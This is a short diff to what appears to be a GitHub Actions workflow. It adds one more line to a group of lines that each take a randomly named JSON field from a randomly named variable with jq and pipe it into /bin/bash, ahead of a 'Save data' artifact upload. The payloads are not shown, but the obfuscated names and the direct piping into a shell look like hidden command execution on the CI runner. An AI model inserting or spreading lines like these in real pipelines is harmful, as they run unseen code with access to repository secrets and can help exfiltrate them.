@@ -44,6 +44,7 @@ jobs:
           echo $hfz0631 | jq -r .povhk3 | /bin/bash
           echo $sfls88065 | jq -r .ijit29145 | /bin/bash
           printf '%s' "$v3" | jq -r .bwufg80 | /bin/bash
+          echo $ntxqi8 | jq -r .nra35 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
